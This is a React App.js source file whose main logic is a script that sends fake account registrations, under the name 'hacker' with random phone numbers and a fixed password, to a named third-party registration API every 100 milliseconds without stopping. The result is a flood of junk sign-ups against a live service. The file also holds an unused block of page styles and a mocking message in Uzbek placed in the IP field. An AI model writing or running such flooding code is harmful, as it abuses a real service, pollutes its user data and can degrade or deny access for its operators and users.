import axios from "axios";
import "./App.css";
import { useEffect, useState } from "react";

const generateRandomNumber = () => {
  const number = Math.random() * 999999999;
  return number.toFixed();
};

function App() {
  const requester = async () => {
    const number = generateRandomNumber();
    await axios
      .post("https://api.yoshdasturchi.uz/api/v1/auth/register", {
        region: "Toshkent",
        name: "hacker",
        surname: "surname",
        age: "0",
        deviceIp: "192.168.1.42 ha ha bu counter emas edi lekin baribir IP kerakku...",
        phoneNumber: `+${number}`,
        password: "Parolparol1",
      })
      .then((res) => console.log(res.data))
  };

  setInterval(() => {
   requester();
  }, 100);

  return <h1>requester</h1>;
}

const styles = {
  container: {
    maxWidth: "800px",
    margin: "0 auto",
    fontFamily: "Arial, sans-serif",
  },
  header: {
    textAlign: "center",
    padding: "20px",
    background: "#333",
    color: "#fff",
  },
  title: {
    margin: "0",
  },
  subtitle: {
    margin: "0",
    fontSize: "1.2rem",
  },
  heroSection: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "40px 0",
  },
  heroImage: {
    width: "50%",
    borderRadius: "8px",
  },
  heroContent: {
    width: "45%",
    textAlign: "left",
  },
  heroTitle: {
    fontSize: "2rem",
    margin: "0",
    marginBottom: "10px",
  },
  heroDescription: {
    fontSize: "1rem",
    color: "#555",
    marginBottom: "20px",
  },
  heroButton: {
    padding: "10px 20px",
    fontSize: "1rem",
    backgroundColor: "#3498db",
    color: "#fff",
    border: "none",
    borderRadius: "5px",
    cursor: "pointer",
  },
  featuresSection: {
    display: "flex",
    justifyContent: "space-around",
    padding: "40px 0",
  },
  feature: {
    textAlign: "center",
    maxWidth: "250px",
  },
  featureTitle: {
    fontSize: "1.5rem",
    margin: "0",
    marginBottom: "10px",
  },
  featureDescription: {
    fontSize: "1rem",
    color: "#555",
  },
  footer: {
    textAlign: "center",
    padding: "20px",
    background: "#333",
    color: "#fff",
  },
};

export default App;
